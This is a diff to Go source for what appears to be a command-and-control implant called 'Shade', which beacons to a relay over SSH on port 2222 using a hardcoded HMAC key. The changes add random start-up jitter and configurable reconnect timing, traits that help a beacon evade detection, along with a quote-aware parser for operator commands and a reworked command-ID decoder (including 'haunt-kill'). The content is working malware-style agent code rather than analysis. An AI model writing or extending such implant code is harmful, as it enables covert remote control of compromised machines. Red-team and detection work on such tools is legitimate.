@@ -31,8 +31,9 @@ var (
 	listenerPort     = "2222"      // SSH port (default: 2222)
 	listenerEndpoint = "/wiki"     // Endpoint path for C2 communication
 
-	// HMAC Key - MUST match relay's AGENT_HMAC_KEY in relay.config
-	hmacKeyHex = "1bb1a2912f7e02e259f969d96357bb84c2c0bf954a0d8674c45ed903bb674b23"
+	hmacKeyHex           = "1bb1a2912f7e02e259f969d96357bb84c2c0bf954a0d8674c45ed903bb674b23"
+	reconnectIntervalStr = "15"
+	jitterSecondsStr     = "10"
 )
 
 var reconnectInterval = 15
@@ -112,10 +113,21 @@ type ProcessInfo struct {
 }
 
 func main() {
-	// Use the global agent ID
+	if interval, err := strconv.Atoi(reconnectIntervalStr); err == nil && interval > 0 {
+		reconnectInterval = interval
+		currentInterval = interval
+	}
+	if jitter, err := strconv.Atoi(jitterSecondsStr); err == nil && jitter >= 0 {
+		jitterSeconds = jitter
+	}
+
+	if jitterSeconds > 0 {
+		initialJitter := rand.Intn(jitterSeconds + 1)
+		time.Sleep(time.Duration(initialJitter) * time.Second)
+	}
+
 	agentName := fmt.Sprintf("Shade-%s", agentID[:8])
 
-	// Get system info
 	osInfo := fmt.Sprintf("%s %s", runtime.GOOS, runtime.GOARCH)
 
 	// Start persistent SSH connection loop
@@ -365,9 +377,60 @@ func sendCommandResponseSSH(client *ssh.Client, commandID int, output, status st
 	return err
 }
 
-// Built-in command handlers
+func parseCommand(command string) []string {
+	var parts []string
+	var current strings.Builder
+	inQuote := false
+	quoteChar := rune(0)
+	escaped := false
+
+	for i, c := range command {
+		if escaped {
+			current.WriteRune(c)
+			escaped = false
+			continue
+		}
+
+		if c == '\\' && i+1 < len(command) {
+			nextChar := rune(command[i+1])
+			if nextChar == '"' || nextChar == '\'' || nextChar == '\\' {
+				escaped = true
+				continue
+			}
+		}
+
+		if !inQuote && (c == '"' || c == '\'') {
+			inQuote = true
+			quoteChar = c
+			continue
+		}
+
+		if inQuote && c == quoteChar {
+			inQuote = false
+			quoteChar = 0
+			continue
+		}
+
+		if !inQuote && (c == ' ' || c == '\t') {
+			if current.Len() > 0 {
+				parts = append(parts, current.String())
+				current.Reset()
+			}
+			continue
+		}
+
+		current.WriteRune(c)
+	}
+
+	if current.Len() > 0 {
+		parts = append(parts, current.String())
+	}
+
+	return parts
+}
+
 func handleBuiltinCommand(command string) (string, error) {
-	parts := strings.Fields(command)
+	parts := parseCommand(command)
 	if len(parts) == 0 {
 		return "", fmt.Errorf("empty command")
 	}
@@ -1304,22 +1367,22 @@ func decodeCommand(command string) string {
 		"14": "haunt-kill",
 	}
 
-	// Parse command to get the first word
-	parts := strings.Fields(command)
-	if len(parts) == 0 {
-		return command
+	spaceIdx := strings.IndexAny(command, " \t")
+	var cmdID string
+	var rest string
+
+	if spaceIdx == -1 {
+		cmdID = command
+		rest = ""
+	} else {
+		cmdID = command[:spaceIdx]
+		rest = command[spaceIdx:]
 	}
 
-	cmdID := parts[0]
-
-	// Check if ID exists in map
 	if cmdName, ok := commandMap[cmdID]; ok {
-		// Replace ID with command name
-		parts[0] = cmdName
-		return strings.Join(parts, " ")
+		return cmdName + rest
 	}
 
-	// No mapping found (either already decoded or custom command), pass through
 	return command
 }
 
